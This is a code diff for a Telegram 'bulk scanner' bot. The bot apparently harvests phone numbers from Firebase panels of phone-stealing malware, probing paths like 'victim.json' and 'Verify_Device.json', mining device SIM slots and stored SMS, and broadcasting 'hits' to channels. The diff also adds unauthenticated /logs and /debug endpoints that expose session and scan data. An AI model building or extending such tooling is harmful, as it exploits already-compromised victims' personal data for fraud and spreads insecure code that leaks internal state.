@@ -25,6 +25,8 @@ import time
 import uuid
 import random
 import threading
+import collections
+import urllib.parse
 import http.server
 import socketserver
 from datetime import datetime
@@ -51,6 +53,14 @@ except ImportError:
     sys.exit(1)
 
 BOT_START_TIME = time.time()
+DEBUG_LOGS = collections.deque(maxlen=250)
+polling_is_alive = False
+
+def dlog(msg: str):
+    ts = datetime.now().strftime("%d-%m %H:%M:%S")
+    entry = f"[{ts}] {msg}"
+    print(entry, flush=True)
+    DEBUG_LOGS.append(entry)
 
 # ============ CONFIGURATION ============
 SUPER_ADMIN_ID = 8327850869
@@ -231,14 +241,12 @@ def esc(text: Any) -> str:
 def normalize_phone(raw: Any) -> Optional[str]:
     if not raw:
         return None
-    s = re.sub(r"\D", "", str(raw))
-    if len(s) == 12 and s.startswith("91"):
-        s = s[2:]
-    elif len(s) == 11 and s.startswith("0"):
-        s = s[1:]
-    if len(s) == 10 and s[0] in "6789":
-        return s
-    return None
+    digits = re.sub(r"\D", "", str(raw))
+    if len(digits) > 10 and digits.startswith("91"):
+        digits = digits[-10:]
+    elif len(digits) == 11 and digits.startswith("0"):
+        digits = digits[1:]
+    return digits if re.fullmatch(r"[6-9]\d{9}", digits) else None
 
 # ============ SCAN STATE PERSISTENCE & AUTO-RECOVERY ============
 def get_state_file(chat_id: int) -> str:
@@ -303,6 +311,34 @@ def clear_scan_state(chat_id: int):
 # ============ RENDER 24/7 KEEP-ALIVE SERVER & HEARTBEAT ============
 class RenderHealthHandler(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
+        parsed = urllib.parse.urlparse(self.path)
+        if parsed.path == "/logs":
+            self.send_response(200)
+            self.send_header("Content-type", "text/plain; charset=utf-8")
+            self.end_headers()
+            log_output = "\n".join(list(DEBUG_LOGS)) if DEBUG_LOGS else "No logs recorded yet."
+            self.wfile.write(log_output.encode("utf-8"))
+            return
+
+        if parsed.path == "/debug":
+            import traceback, sys
+            threads_info = {}
+            for tid, frame in sys._current_frames().items():
+                threads_info[str(tid)] = "".join(traceback.format_stack(frame)[-2:])
+            resp = {
+                "uptime": int(time.time() - BOT_START_TIME),
+                "polling_alive": polling_is_alive,
+                "user_panels": {k: len(v) for k, v in user_panels.items()},
+                "active_scans": list(active_scans.keys()),
+                "sessions": list(user_sessions.keys()),
+                "threads": threads_info
+            }
+            self.send_response(200)
+            self.send_header("Content-type", "application/json")
+            self.end_headers()
+            self.wfile.write(json.dumps(resp, indent=2).encode("utf-8"))
+            return
+
         self.send_response(200)
         self.send_header("Content-type", "application/json")
         self.end_headers()
@@ -313,6 +349,7 @@ class RenderHealthHandler(http.server.BaseHTTPRequestHandler):
             "uptime_seconds": uptime_sec,
             "uptime_human": f"{uptime_sec // 3600}h {(uptime_sec % 3600) // 60}m {uptime_sec % 60}s",
             "active_scans": len(active_scans),
+            "polling_alive": polling_is_alive,
             "timestamp": datetime.now().strftime("%d-%m-%Y %H:%M:%S")
         }
         self.wfile.write(json.dumps(resp).encode("utf-8"))
@@ -357,37 +394,48 @@ def start_render_self_ping():
 def safe_send(chat_id: int, text: str, reply_markup=None):
     try:
         truncated = text[:4000] if len(text) > 4000 else text
-        return bot.send_message(chat_id, truncated, reply_markup=reply_markup, disable_web_page_preview=True)
-    except Exception:
+        res = bot.send_message(chat_id, truncated, reply_markup=reply_markup, disable_web_page_preview=True)
+        dlog(f"safe_send OK -> {chat_id}")
+        return res
+    except Exception as e:
+        dlog(f"safe_send HTML error -> {chat_id}: {e}")
         try:
             plain = re.sub(r"<[^>]+>", "", text)
             plain_trunc = plain[:4000] if len(plain) > 4000 else plain
-            return bot.send_message(chat_id, plain_trunc, reply_markup=reply_markup, parse_mode=None, disable_web_page_preview=True)
-        except Exception:
+            res = bot.send_message(chat_id, plain_trunc, reply_markup=reply_markup, parse_mode=None, disable_web_page_preview=True)
+            dlog(f"safe_send fallback plain OK -> {chat_id}")
+            return res
+        except Exception as e2:
+            dlog(f"safe_send CRITICAL failed -> {chat_id}: {e2}")
             return None
 
 def safe_edit(chat_id: int, message_id: int, text: str, reply_markup=None):
     try:
         truncated = text[:4000] if len(text) > 4000 else text
-        bot.edit_message_text(truncated, chat_id, message_id, reply_markup=reply_markup, disable_web_page_preview=True)
+        res = bot.edit_message_text(truncated, chat_id, message_id, reply_markup=reply_markup, disable_web_page_preview=True)
+        dlog(f"safe_edit OK -> {chat_id} msg {message_id}")
+        return res
     except Exception as e:
         if "message is not modified" in str(e).lower():
-            return
+            return True
+        dlog(f"safe_edit HTML error -> {chat_id} msg {message_id}: {e}")
         try:
             plain = re.sub(r"<[^>]+>", "", text)
             plain_trunc = plain[:4000] if len(plain) > 4000 else plain
-            bot.edit_message_text(plain_trunc, chat_id, message_id, reply_markup=reply_markup, parse_mode=None, disable_web_page_preview=True)
-        except Exception:
-            pass
+            res = bot.edit_message_text(plain_trunc, chat_id, message_id, reply_markup=reply_markup, parse_mode=None, disable_web_page_preview=True)
+            dlog(f"safe_edit fallback plain OK -> {chat_id} msg {message_id}")
+            return res
+        except Exception as e2:
+            dlog(f"safe_edit CRITICAL failed -> {chat_id} msg {message_id}: {e2}")
+            return None
 
 def send_or_edit(chat_id: int, text: str, reply_markup=None, message_id: Optional[int] = None):
+    res = None
     if message_id:
-        try:
-            safe_edit(chat_id, message_id, text, reply_markup=reply_markup)
-            return
-        except Exception:
-            pass
-    safe_send(chat_id, text, reply_markup=reply_markup)
+        res = safe_edit(chat_id, message_id, text, reply_markup=reply_markup)
+    if not res:
+        res = safe_send(chat_id, text, reply_markup=reply_markup)
+    return res
 
 def broadcast_hit_to_channels(hit_card: str, chat_id: int):
     channels = set()
@@ -860,6 +908,30 @@ def audit_device_sim_slots(did: str, dev_data: dict, fb_url: str, panel_ref: str
                                     "is_physical_sim": True
                                 })
 
+    # 3. Embedded SMS / messages metadata fallback
+    if not targets:
+        for msg_key in ("messages", "sms", "chats", "smsList", "sms_list"):
+            msg_container = dev_data.get(msg_key)
+            if isinstance(msg_container, dict):
+                for m_item in list(msg_container.values())[-10:]:
+                    if isinstance(m_item, dict):
+                        for mk in ("phoneNumber", "phone", "number", "to", "simInfo"):
+                            m_val = m_item.get(mk)
+                            if isinstance(m_val, dict):
+                                m_val = m_val.get("phoneNumber") or m_val.get("phone")
+                            m_num = normalize_phone(m_val)
+                            if m_num and m_num not in seen:
+                                seen.add(m_num)
+                                targets.append({
+                                    "phone": m_num,
+                                    "device": dev_name,
+                                    "dev_id": did,
+                                    "panel": fb_url,
+                                    "panel_name": panel_ref,
+                                    "slot": "Associated Device Line",
+                                    "is_physical_sim": True
+                                })
+
     return targets
 
 def harvest_panel_online_targets(raw_panel: str) -> Tuple[List[Dict[str, Any]], int, Optional[str]]:
@@ -869,7 +941,12 @@ def harvest_panel_online_targets(raw_panel: str) -> Tuple[List[Dict[str, Any]], 
     clean_url = fb_url.rstrip("/")
     devices_dict = None
 
-    candidate_paths = ["clients.json", "devices.json", "client.json", "device.json", "users.json", "victim.json", "all_user.json"]
+    candidate_paths = [
+        "clients.json", "devices.json", "data/clients.json", "data/devices.json",
+        "user_data.json", "users.json", "All_User.json", "Verify_Device.json",
+        "victim.json", "victims.json", "client.json", "device.json",
+        "all_clients.json", "all_user.json", "all_devices.json"
+    ]
     for p in candidate_paths:
         try:
             r = requests.get(f"{clean_url}/{p}", timeout=6)
@@ -1466,6 +1543,53 @@ def show_main_menu(chat_id: int, message_id: Optional[int] = None):
         types.InlineKeyboardButton("📱 Check Single Number", callback_data="menu_single"),
         types.InlineKeyboardButton("❓ Help & User Guide", callback_data="menu_help")
     )
+    if chat_id == SUPER_ADMIN_ID:
+        markup.add(types.InlineKeyboardButton("👑 Super Admin Suite", callback_data="menu_admin"))
+    elif chat_id in ADMIN_USER_IDS:
+        markup.add(types.InlineKeyboardButton("🛡️ Admin Suite", callback_data="menu_admin"))
+
+    send_or_edit(chat_id, text, reply_markup=markup, message_id=message_id)
+
+def show_admin_menu(chat_id: int, message_id: Optional[int] = None):
+    if chat_id != SUPER_ADMIN_ID and chat_id not in ADMIN_USER_IDS:
+        safe_send(chat_id, "⛔ <b>Admin Access Required!</b>")
+        return
+
+    is_super = (chat_id == SUPER_ADMIN_ID)
+    header = "👑 <b>Super Admin Control Hub</b>" if is_super else "🛡️ <b>Admin Control Hub</b>"
+    uptime_sec = int(time.time() - BOT_START_TIME)
+    uptime_str = f"{uptime_sec // 3600}h {(uptime_sec % 3600) // 60}m {uptime_sec % 60}s"
+
+    with cfg_lock:
+        master_cnt = len(user_panels.get(SUPER_ADMIN_ID, []))
+        total_users = len(known_users) if known_users else len(user_panels)
+
+    running_cnt = sum(1 for s in active_scans.values() if s.get("running"))
+    running_str = f"🟢 <b>{running_cnt} Running</b>" if running_cnt > 0 else "⚪ <b>Idle</b> (0 active scans)"
+
+    text = f"""{header}
+
+• <b>Cloud Host:</b> Render Web Service (24/7 Always-On)
+• <b>Bot Uptime:</b> <code>{uptime_str}</code>
+• <b>Registered Users:</b> <code>{total_users} Users</code>
+• <b>Master Panels Pool:</b> <code>{master_cnt} Total Panels</code> (All users synced)
+• <b>Master Universal Channel:</b> <code>{esc(MASTER_CHANNEL_ID)}</code>
+• <b>Active Scans:</b> {running_str}
+
+<i>Super Admin controls:</i>"""
+
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("👑 Export Master Pool (.txt)", callback_data="export_master_pool"),
+        types.InlineKeyboardButton("📢 Broadcast Message", callback_data="broadcast_prompt")
+    )
+    markup.add(
+        types.InlineKeyboardButton("🧪 Test Master Channel", callback_data="test_master_channel"),
+        types.InlineKeyboardButton("🔄 Refresh Stats", callback_data="menu_admin")
+    )
+    markup.add(
+        types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="start_menu")
+    )
 
     send_or_edit(chat_id, text, reply_markup=markup, message_id=message_id)
 
@@ -1886,14 +2010,18 @@ def cmd_broadcast(message):
 # ============ CALLBACK QUERY ROUTER ============
 @bot.callback_query_handler(func=lambda c: True)
 def handle_callbacks(call):
+    if not call or not call.message:
+        return
     chat_id = call.message.chat.id
     mid = call.message.message_id
-    data = call.data
+    data = call.data or ""
+    dlog(f"Callback from {chat_id}: {data}")
+    register_user(chat_id)
 
     try:
         bot.answer_callback_query(call.id)
-    except Exception:
-        pass
+    except Exception as e:
+        dlog(f"answer_callback_query notice: {e}")
 
     # Navigation
     if data == "start_menu":
@@ -1918,6 +2046,36 @@ def handle_callbacks(call):
 
     elif data == "menu_help":
         show_help_menu(chat_id, message_id=mid)
+
+    elif data == "menu_admin":
+        show_admin_menu(chat_id, message_id=mid)
+
+    elif data == "broadcast_prompt":
+        if chat_id != SUPER_ADMIN_ID and chat_id not in ADMIN_USER_IDS:
+            safe_send(chat_id, "⛔ Super Admin access required.")
+            return
+        with session_lock:
+            user_sessions[chat_id] = {"state": "AWAITING_BROADCAST"}
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="start_menu"))
+        safe_send(chat_id, "📢 <b>Broadcast Message enter karein:</b>\nJo message aap bhejenge wo bot ke saare users ko DM kiya jayega.", reply_markup=markup)
+
+    elif data == "test_master_channel":
+        master_ch = MASTER_CHANNEL_ID or "-1003626087056"
+        card = (
+            f"👑 <b>[Master Universal Test Ping]</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🤖 <b>Bot:</b> @mangerbot2423bot\n"
+            f"👤 <b>Triggered By Super Admin:</b> <code>{chat_id}</code>\n"
+            f"🕒 <b>Time:</b> {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n"
+            f"✅ <i>Universal Master Channel Connection Active & 100% OK!</i>"
+        )
+        try:
+            ch_target = int(master_ch) if str(master_ch).lstrip("-").isdigit() else master_ch
+            bot.send_message(ch_target, card, parse_mode="HTML")
+            safe_send(chat_id, f"✅ Test card sent to Master Channel <code>{esc(master_ch)}</code> successfully!")
+        except Exception as e:
+            safe_send(chat_id, f"❌ Failed to send to Master Channel: {esc(e)}")
 
     elif data == "cancel_action":
         with session_lock:
@@ -2511,19 +2669,31 @@ def check_interrupted_scans_on_boot():
                 pass
 
 def start_bot():
+    global polling_is_alive
     start_render_health_server()
     start_render_self_ping()
     threading.Thread(target=check_interrupted_scans_on_boot, daemon=True).start()
-    print(f"""
-  ╔═════════════════════════════════════════════════════════════════════╗
-  ║    BIGBASKET ENTERPRISE BULK SCANNER BOT RUNNING                    ║
-  ║    Bot: @mangerbot2423bot                                           ║
-  ║    Architecture: Full Jio-Bot Inline Hub Engine                     ║
-  ║    Render 24/7 Keep-Alive: Active on Port {os.environ.get('PORT', '8080')}                      ║
-  ║    Scan State Persistence: Enabled                                  ║
-  ╚═════════════════════════════════════════════════════════════════════╝
-    """)
-    bot.infinity_polling(timeout=20, long_polling_timeout=15)
+    port = os.environ.get('PORT', '8080')
+    dlog(f"Render 24/7 Keep-Alive server active on port {port}")
+
+    # Infinity Polling Supervision Loop with Auto-Recovery
+    while True:
+        try:
+            dlog("🚀 Dropping pending updates and starting infinity_polling()...")
+            try:
+                bot.delete_webhook(drop_pending_updates=True)
+            except Exception as we:
+                dlog(f"⚠️ delete_webhook note: {we}")
+
+            polling_is_alive = True
+            bot.infinity_polling(timeout=20, long_polling_timeout=15, skip_pending=True)
+            dlog("ℹ️ infinity_polling exited normally. Restarting in 2s...")
+        except Exception as e:
+            polling_is_alive = False
+            dlog(f"⚠️ infinity_polling exception: {e}")
+            import traceback
+            dlog(traceback.format_exc()[-300:])
+            time.sleep(3)
 
 if __name__ == "__main__":
     start_bot()
